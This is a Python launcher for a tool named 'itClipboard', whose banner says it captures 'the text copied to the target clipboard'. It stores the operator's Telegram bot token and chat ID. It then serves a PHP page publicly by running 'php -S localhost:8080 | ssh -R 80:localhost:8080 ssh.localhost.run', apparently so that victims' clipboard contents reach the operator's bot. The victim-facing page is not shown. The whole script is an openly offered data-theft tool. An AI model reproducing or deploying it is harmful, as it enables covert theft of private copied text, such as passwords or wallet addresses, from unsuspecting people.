# itClipboard v1
# Code By it4min 
# t.me/it4min
# t.me/LinuxArmy
import os

banner = '''\033[35m
 _ _       ___ _ _       _                         _  
(_) |_    / __\ (_)_ __ | |__   ___   __ _ _ __ __| | 
| | __|  / /  | | | '_ \| '_ \ / _ \ / _` | '__/ _` | 
| | |_ _/ /___| | | |_) | |_) | (_) | (_| | | | (_| | 
|_|\__(_)____/|_|_| .__/|_.__/ \___/ \__,_|_|  \__,_| 
                  |_|     \033[35m
                                                   
\033[33mCode By it4min | KFE\033[33m
\033[33mt.me/LinuxArmy\033[33m

\033[36mTo get the text copied to the target clipboard\033[36m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'''

def save_data(chat_id, token):
    data = '{"chat_id": "'+chat_id+'", "token": "'+token+'"}'
    f = open("data.json", "w")
    f.write(data)
    f.close()

if __name__ == '__main__':
    os.system("clear")
    print(banner)
    token = input("\033[34m >>\033[34m> \033[32mEnter the robot token: ")
    chat_id = input("\033[34m >>\033[34m> \033[32mEnter your chat ID: ")
    save_data(chat_id, token)
    os.system("php -S localhost:8080 | ssh -R 80:localhost:8080 ssh.localhost.run")
    
